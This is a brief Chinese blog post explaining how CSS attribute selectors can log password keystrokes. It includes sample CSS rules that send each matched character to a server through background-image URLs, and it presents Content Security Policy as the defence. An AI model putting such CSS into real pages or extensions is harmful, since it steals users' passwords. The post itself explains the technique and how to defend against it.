---
title: 使用css selector 记录用户输入信息
date: 2019-12-13 14:09:22
tags: [web security, web fronted]
---

## CSS3 Selector
  实现使用 CSS 记录用户信息主要使用了 CSS3 中的 selector。

| 序号 | 选择器 | 含义 |
| :-----| :---- | :---- |
| 1 | E[attr^="val"] | 属性 attr 的值以 "val" 开头的元素 |
| 2 | E[att$="val"] | 属性 attr 的值以 "val" 结尾的元素 |
| 3 | E[att*="val"] | 属性 attr 的值以 "val" 字符串的元素 |

## 键位匹配

浏览器自身默认不会将用户输入的值同步到 value 中, 但像一些框架会将用户输入值同步到 value 中。[Demo Link](https://codepen.io/epson-lee/pen/vYYzaNb?editors=0010)

![demo.gif](https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/css-keylogger.gif)

将值同步到 value 之后，我们可以使用 css 来做匹配，对应的键位发送到不同的链接。

```css
/* 命中 0 时 请求对应的接口 */
input[type="password"][value$="0"] {
  background-image: url("http://localhost:3000/0"); 
}
/* 命中 1 时 请求对应的接口 */
input[type="password"][value$="1"] {
  background-image: url("http://localhost:3000/1"); 
}
```

## 防御措施

在知道可以使用 css 来记录按键之后我兴冲冲的找到对应的 github demo，按照文档所说打开 [https://instagram.com](https://instagram.com)，安装 Chrome Extension、输入密码但却然而却发现并没有记录到信息，出现了如下的错误信息：

![Error Info](https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/css-keylogger-error.png)

在 antd-design-pro 示例登录页倒是可以。

![antd-design-pro 示例登录页](https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/1.gif)

这是因为 [https://instagram.com](https://instagram.com) 使用了 CSP (Content Security Policy)。 说白了就是为了页面安全而制定的一系列防护措施，通过CSP所约束的规则制定可信的内容来源（脚本、图片、iframe、fton、style 等可能的远程资源）。

## 引用

[CSS Keylogger](https://github.com/maxchehab/CSS-Keylogging)
[Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击](https://www.zhihu.com/question/21979782)